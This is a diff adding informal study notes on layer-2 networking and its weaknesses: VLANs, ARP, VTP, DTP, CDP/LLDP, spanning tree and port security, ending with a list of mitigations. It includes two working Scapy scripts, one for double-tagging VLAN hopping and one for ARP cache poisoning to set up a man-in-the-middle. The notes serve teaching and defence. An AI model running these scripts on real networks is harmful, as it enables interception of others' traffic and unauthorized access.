@@ -288,7 +288,292 @@ Builds MAC Address table (CAM)
   # VLAN
 
   	Default - VLAN 1
-    Data - User Traffic
+    	Data - User Traffic
 	Voice - VOIP traffic
- 	Management - Switch and router mgmt
+ 	Management - Switch and router mgmt (Usually want it out of band)
   	Native - Untagged switch and router traffic
+
+![802 1QFrame](https://github.com/user-attachments/assets/f6696d90-bee9-46a8-a313-2498b1d36d31)
+
+	VLAN tag will go to switch, once it takes it, it'll be removed and ethertype would be put back in place
+
+ ## 802.1AD Header
+
+ 
+![802 1adframe](https://github.com/user-attachments/assets/c159df1c-ea9d-436a-9afd-848a80bb948b)
+
+## VLAN Hopping ATTACK
+
+	Swith Spoofing
+ 	Single Tagging
+  	Double TAgging(Using native VLAN)
+   	SCAPY Example Code
+
+```
+a=Ether()
+a.dst="ff:ff:ff:ff:ff:ff"
+a.src="01:02:03:aa:bb:cc"
+a.type=0x8100            #VLAN Tag will Follow
+
+b=Dot1Q()
+b.vlan=1                 #Native VLAN
+b.type=0x8100            #Another VLAN Tag will Follow
+
+c=Dot1Q()
+c.vlan=20                #Target VLAN
+c.type=0x0800            #IPv4 or any other Ethertype that is encapsulated
+
+d=IP()
+d.proto=6                #specifies that TCP is encapsulated. Change to 1 for ICMP or 17 for UDP.
+d.src="10.10.0.40"       #Any source IP
+d.dst="172.16.82.106"    #Target IP
+
+e=TCP()
+e.sport=54321
+e.dport=80
+
+f="message"
+
+a.show()
+b.show()
+c.show()
+d.show()
+e.show()
+
+sendp(a/b/c/d/e/f)
+
+```
+
+# ARP Header
+
+
+![ARP_Header](https://github.com/user-attachments/assets/ceaf05ed-1bb2-49a2-9f77-ecda20321d98)
+
+Find Byte Offset Value by adding offset size (Left) and add to number in second row going horizontal
+
+Ex. Protocol Address Length is 4 + 1 = 5
+
+*** KNOW OPERATION TYPES ***
+
+## Types
+
+ARP(OP 1 and 2) (Req and Reply)
+RARP (OP 3 and 4) (RReq and RReply)
+Proxy Arp (OP 2/Reply) (Legit, used like a forward)
+Gratuitous ARP(OP 2/Reply) Received reply when no request is sent)
+
+
+## ARP CACHE
+
+All resolved MAC to IP resolutions
+
+If MAC is not in cache then ARP is used
+
+Dynamic entries last from 2-20 minutes
+
+Default gateway is present at minimum
+
+Can be easily duped(spoofed) by attackers
+
+
+
+MITM with ARP
+	Poison ARP Cache with:
+
+		Gratuitous ARP
+
+		Proxy ARP
+
+  SCAPY Example Code
+
+```
+my_mac = ""             # Insert your MAC address
+victim1_mac = ""        # Insert the MAC address of Victim1
+victim1_ip = ""         # Insert the IP address of Victim1
+victim2_mac = ""        # Insert the MAC address of Victim2
+victim2_ip = ""         # Insert the IP address of Victim2
+
+# -- ARP to Poison Victim 1 to pretend to be Victim 2 --
+a = Ether()
+a.src= my_mac
+a.dst= victim1_mac
+a.type= 0x0806
+
+b = ARP()
+b.op= 2
+b.hwsrc= my_mac
+b.psrc= victim2_ip
+b.hwdst= victim1_mac
+b.pdst= victim1_ip
+
+# -- ARP to Poison Victim 2 to pretend to be Victim 1 --
+c = Ether()
+c.src= my_mac
+c.dst= victim2_mac
+c.type= 0x0806
+
+d = ARP()
+d.op= 2
+d.hwsrc= my_mac
+d.psrc= victim1_ip
+d.hwdst= victim2_mac
+d.pdst= victim2_ip
+
+a.show()
+b.show()
+c.show()
+d.show()
+
+sendp(a/b); sendp(c/d)
+
+```
+
+## VLAN Trunking Protocol (VTP)
+
+
+![VTP](https://github.com/user-attachments/assets/4fd051b5-85f9-4980-8faf-89d949f11f34)
+	
+ 	Dynamically add/remove/modify VLANs
+
+If using VLAN you are probably using VTP
+
+### Cisco proprietary
+
+	Modes:
+
+		Server
+
+		Client
+
+		Transparent(Special hidden VLAN, is not affected by server or rest of net)
+## VTP Vulnerability
+
+	Can cause switches to dump all VLAN info
+
+ 	Cause a DoS as switch will not support configured VLANS
+
+
+## DTP
+
+![DTP_Chart](https://github.com/user-attachments/assets/61d027a1-70b0-4361-80c3-72542e281554)
+
+Used to dynamically create trunk links
+
+	Cisco proprietary
+
+		Modes:
+
+			Dynamic-Auto
+
+			Dynamic-Desirable
+
+   	On by deafukt
+
+	Can send crafted messages to foirm a VLAN trunk link
+ 	Recommend to :
+  		Disable DTP negotiations
+    		Manually assign as access or trunk
+
+## CDP, FDP and LLDP (Proprietary)
+
+	Cisco Discovery Protocol (CDP)
+
+	Foundry Discovery Protocol (FDP)
+
+	Link Layer Discovery Protocol (LLDP)
+
+### Vulnerabilities
+
+	
+	Leaks valuable information
+
+	Clear Text
+
+	Enabled by default
+
+	Disable it:
+
+		Globally
+
+		Per interface
+
+	May require it for VOIP
+
+ 
+## Spanning Tree Protocol (STP)
+
+![Spanning-Tree-Protocol-Overview](https://github.com/user-attachments/assets/8e043fb1-47c0-4fb0-9197-61fe7024e87c)
+
+
+	Root Decision Process (Convergence)
+
+		1. Elect root Bridge ( Who is tied to router, will designaete root port)
+
+		2. Identify the Root ports on non-root bridge 
+
+		3. Identify the Designated port for each segment
+		
+		4. Set alternate ports to blocking state
+
+### STP Types
+
+	802.1D STP
+
+	Per VLAN Spanning Tree + (PVST+)
+
+	802.1w – Rapid Spanning Tree Protocol (RSTP)
+
+	Rapid Per VLAN Spanning Tree + (RPVST+)
+
+	802.1s (Multiple Spanning Tree)
+
+ All basicaly do same thing, finds the quickest way out
+
+
+### Spanning Tree Attack
+
+	Crafted Bridge Protocol Data units (BPDU)
+
+	Used to perform a DoS or MitM
+
+## Port Security
+
+	Shutdown (default)
+
+	Protect
+
+	Restrict
+
+ When device is plugged into switch, if MAC matches what it has, it'll be fine
+ If it doesn't it'll execute one of the three modes above
+
+
+CAN HELP TO:
+
+	Restrict unauthorized access
+
+	Limit MAC address learned on port
+
+	Prevent CAM Table Overflow attacks
+### Port Sec Vul
+
+	Dependant on MAC address
+
+	MAC spoofing
+  
+
+## LAYER 2 ATTACK MITIGATION TECHNIQUES
+	Shutdown unused ports
+
+	Enable Port Security
+
+	IP Source Guard
+
+	Manually assign STP Root
+
+	BPDU Guard
+
+	DHCP Snooping
+
+
+ 
